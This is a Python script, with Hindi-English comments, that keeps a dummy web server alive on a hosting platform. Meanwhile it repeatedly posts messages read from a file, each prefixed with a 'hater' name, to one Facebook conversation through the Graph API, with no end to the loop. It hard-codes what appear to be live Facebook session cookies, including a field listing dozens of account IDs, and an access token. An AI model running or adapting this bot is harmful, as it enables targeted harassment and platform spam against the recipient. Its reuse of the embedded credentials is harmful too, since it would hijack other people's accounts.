import requests
import time
import sys
import os
import http.server
import socketserver
import threading
from platform import system

# --- CONFIGURATION ---
COOKIES = "datr=tVYVZWl58HyjpwHKAyi5bw1F; sb=tVYVZYPgZaY6B-uGqpIPoPDm; m_pixel_ratio=2.8125; usida=eyJ2ZXIiOjEsImlkIjoiQXM4dXF5NzFnc2RmamEiLCJ0aW1lIjoxNzA3OTI0NDYzfQ%3D%3D; ps_l=1; ps_n=1; oo=v1; pas=100003906934330%3AwgAWalYUmi%2C100004399845208%3ASlIj03v5ES%2C100070692953094%3AutulEWvl7B%2C61572838536475%3AesAhcws6QB%2C100083936531440%3AdsCAwLYyj2%2C100027205080212%3A3kmQgB59wA%2C100044203363472%3AY8tNvAi61q%2C61572564373904%3AHewlnxdrCd%2C100072620126563%3AD9D1jW46LE%2C61573693710968%3ADbz1kJiOzM%2C100044554087935%3A4ASz3G46A1%2C100001743870831%3A79JjzCbEXF%2C61572406665836%3AdZ6bxPs1kz%2C61567710675311%3AFqY4RANRwB%2C100068682382521%3AQE5NjPXdNU%2C100003773046435%3A0aAyf7OTpV%2C61567342787964%3AcSh3N257Bb%2C100023424317842%3AjFRsHd91DA%2C61567875546626%3AeWVslmhg66%2C61568325472223%3ApMLdrFM61s%2C100087327818099%3AZjcBDWWXd1%2C61567829974612%3Ai57UEHR5GJ%2C100054603944602%3AvwqNoO7A8W%2C61568320341249%3ASP7MgpSQWM%2C100089577667420%3AWeagxH3yhn%2C61567845994413%3AWbuJ7tTHVp%2C100083921045165%3A6a8G75UAI5%2C100055824259605%3AhVJqGQdxj4%2C100054350903812%3AK9wTLHgkqa%2C100087460176150%3AAUDkZWgDfF%2C61573400293025%3ARn3htHzMwi%2C61573799214936%3Aa3kHQLBWJH%2C61573296885251%3A0hkUR31kBO%2C61573517840123%3AJ2P2xw5hXB%2C61572877875496%3AQizcEyEHkg%2C100052060385939%3AHyVnd3wpPc%2C61573348106112%3ARDPu0vIV5o%2C100087755821342%3A4IL0mFOySQ%2C61572728625064%3Acek7z9hJHp%2C61573886042952%3AxOEcQcGa81%2C61573677425725%3AsjIQKWRHrV%2C61573316560414%3Acetk1dlYoo%2C61573119009091%3AlB1a7AUzpm%2C100087090830740%3AtUZ9KgzdJl%2C100026185817360%3AK6y4cIK9dY%2C100045192306406%3AfesRdl4ArC%2C100031082015691%3AcsNGRThRe6%2C100076620437000%3AkJhz7qrh8z%2C61573176509790%3AT0ZMIrAyyW%2C100069098898976%3AtdTrsUSlBa%2C100008303177414%3A6qrUUqzugz%2C100069559960225%3ANNze9Dv0Xk%2C100063552933634%3ABehhg4tQbN%2C100036884583435%3AkigsFYiiOG%2C100075504235837%3AgCCpzVQdf9%2C100029130043949%3ABNrAkxRJE9%2C100063010223024%3AxMRh6IseE2%2C100027988191283%3AHFb6QjxMmo;"
TOKEN = "EAABsbCS1iHgBQKstb1wsq8PZCmPS4P2aa8fBImAkKEFYYCsZBTN5JV5gkZCUFTNuaJqXeFm9xWaFwO6E4E41x0zjg5Vw4VM2io3bsu4XxXanJCWoldZCEy3DTIZAATOQX4px9k0gcEOD9HRJEznXstVC2hrJ4sOeZC95nZCwzV4QUo6noXZCetQgwdAooep33bkOsgZDZD"
TARGET_ID = "1193054742256819"

# Render Port Binding Fix
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Convo Server is Running!")

def run_server():
    PORT = int(os.environ.get('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Web server running on port {PORT}")
        httpd.serve_forever()

def send_messages():
    try:
        # Files check
        with open('time.txt', 'r') as f: delay = int(f.read().strip())
        with open('haternames.txt', 'r') as f: hater = f.read().strip()
        with open('file.txt', 'r') as f: msg_path = f.read().strip()
        
        # Extension fix agar file.txt mein .txt nahi likha hai
        if not msg_path.endswith('.txt'):
            msg_path += '.txt'
            
        with open(msg_path, 'r') as f:
            messages = [m.strip() for m in f.readlines() if m.strip()]

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Cookie': COOKIES
        }

        print("Convo process started...")
        while True:
            for i, msg in enumerate(messages):
                # Graph API endpoint
                url = f"https://graph.facebook.com/v15.0/t_{TARGET_ID}/"
                payload = {'message': f"{hater} {msg}", 'access_token': TOKEN}
                
                response = requests.post(url, data=payload, headers=headers)
                t = time.strftime("%I:%M:%S %p")
                
                if response.status_code == 200:
                    print(f"[{t}] Sent Msg {i+1}: {hater} {msg}")
                else:
                    print(f"[{t}] Failed: {response.text}")
                
                time.sleep(delay)
            print("\n[+] Loop Completed. Restarting...\n")

    except Exception as e:
        print(f"Fatal Error: {e}")

if __name__ == "__main__":
    # Server ko thread mein chalayein taaki dono kaam ek sath hon
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Convo start karein
    send_messages()

